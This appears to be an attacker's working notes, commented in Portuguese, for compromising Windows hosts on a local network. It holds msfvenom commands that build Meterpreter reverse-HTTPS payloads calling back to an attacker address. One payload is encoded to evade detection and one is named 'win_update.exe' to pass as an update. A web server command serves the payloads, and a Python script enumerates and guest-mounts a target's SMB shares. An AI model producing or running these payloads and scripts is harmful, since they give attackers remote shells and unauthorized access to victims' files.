msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

# Criando um script Python para montar automaticamente shares SMB acessíveis em pastas locais

script_mount_smb = """
import subprocess
import os

ip_alvo = "192.168.1.84"  # Alvo SMB
mount_base_dir = os.path.expanduser("~/smb_mounts")

# Criar diretório base para montagens
os.makedirs(mount_base_dir, exist_ok=True)

print(f"Procurando shares SMB públicos no host {ip_alvo}...")

# Usando smbclient para listar shares
proc = subprocess.run(["smbclient", "-L", ip_alvo, "-N"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
output = proc.stdout

shares = []
for line in output.splitlines():
    if "Disk" in line and not line.startswith("\t"):
        share_name = line.strip().split()[0]
        shares.append(share_name)

if not shares:
    print("Nenhuma share pública encontrada.")
else:
    print(f"Shares encontrados: {shares}\\n")
    for share in shares:
        mount_point = os.path.join(mount_base_dir, share)
        os.makedirs(mount_point, exist_ok=True)
        print(f"Montando //{ip_alvo}/{share} em {mount_point}...")
        mount_cmd = [
            "sudo", "mount", "-t", "cifs", f"//{ip_alvo}/{share}", mount_point, "-o", "guest,vers=1.0"
        ]
        result = subprocess.run(mount_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print(f"Share {share} montada com sucesso em {mount_point}.")
        else:
            print(f"Falha ao montar {share}: {result.stderr}")

print("\\nScript de montagem SMB concluído.")
"""

with open("/mnt/data/mount_smb_shares.py", "w") as f:
    f.write(script_mount_smb)

print("Script pronto criado como 'mount_smb_shares.py'.")


